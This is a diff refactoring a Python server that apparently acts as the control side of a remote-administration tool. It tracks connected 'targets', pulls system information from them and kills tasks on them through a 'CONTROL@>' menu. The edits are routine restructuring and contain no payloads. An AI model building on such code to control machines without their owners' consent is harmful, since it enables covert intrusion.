@@ -14,7 +14,7 @@ import io
 import validation
 import screenshot
 import connectedstations
-import tasks
+from tasks import Tasks
 import sysinfo
 from freestyle import freestyle
 
@@ -32,7 +32,6 @@ class Server:
     targets = []
     threads = []
     tmp_availables = []
-    last_reboot = psutil.boot_time()
 
     def __init__(self, serverIP, serverPort, ttl, path):
         self.serverIp = serverIP
@@ -42,7 +41,6 @@ class Server:
         self.server = socket.socket()
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server.bind((self.serverIp, self.serverPort))
-        # self.chunk = 40960000
         self.server.listen(5)
 
         if not os.path.exists(self.path):
@@ -414,25 +412,12 @@ class Server:
 
                 try:
                     sysinfo.system_information(con, self.ttl)
-                    # self.system_information(con)
 
                 except ConnectionResetError:
                     print(f"[{colored('!', 'red')}]Client lost connection.")
                     try:
-                        for conKey, ipValue in self.clients.items():
-                            for ipKey, identValue in ipValue.items():
-                                if conKey == con and ipKey == ip:
-                                    self.targets.remove(con)
-                                    self.ips.remove(ip)
-
-                                    del self.clients[conKey]
-                                    del self.connections[con]
-                                    for identKey, userValue in identValue.items():
-                                        print(f"[{colored('*', 'red')}]({colored(f'{ip}', 'red')} | "
-                                              f"{colored(f'{identKey}', 'red')} | "
-                                              f"{colored(f'{userValue}', 'red')}) "
-                                              f"has been removed from the availables list.")
-                        break
+                        self.remove_lost_connection(con, ip)
+                        return
 
                     except RuntimeError:
                         return
@@ -520,15 +505,16 @@ class Server:
                     print(f"[{colored('*', 'red')}]No connected stations.")
                     break
 
-                if not tasks.tasks(con, ip, self.ttl, self.clients, self.connections):
+                tasks = Tasks(con, ip, ttl, self.clients, self.connections, self.targets, self.ips)
+                if not tasks.tasks():
                     return False
 
-                task = tasks.kill_tasks(con, ip, self.clients, self.connections)
+                task = tasks.kill_tasks()
                 if task is None:
                     continue
 
                 try:
-                    tasks.task_to_kill(con, ip, self.clients, self.connections)
+                    tasks.task_to_kill()
                     return True
 
                 except ConnectionResetError:
@@ -606,14 +592,16 @@ def main():
     # Wait For User Commands
     command = input("CONTROL@> ")
 
-    try:  # Listen for broken connections
+    # Input Validation
+    try:
         int(command)
 
     except ValueError:
         print(
             f"[{colored('*', 'red')}]Numbers only. Choose between "
             f"[{colored('1', 'yellow')} - {colored('5', 'yellow')}].\n")
-        return
+
+        return False
 
     if int(command) <= 0 or int(command) > 6:  # Validate input is in the menu
         print(f"[{colored('*', 'red')}]Wrong Number. [{colored('1', 'yellow')} - {colored('5', 'yellow')}]!")
@@ -660,9 +648,10 @@ def main():
 
     # Show Server's Information
     elif int(command) == 5:
+        last_reboot = psutil.boot_time()
         print(f"\n[{colored('*', 'cyan')}]Server running on IP: {server.serverIp} | Port: {server.serverPort}")
         print(f"[{colored('*', 'cyan')}]Server's last restart: "
-              f"{datetime.fromtimestamp(server.last_reboot).replace(microsecond=0)}")
+              f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}")
         print(f"[{colored('*', 'cyan')}]Connected Stations: {len(server.clients)}\n")
 
     # Exit Program
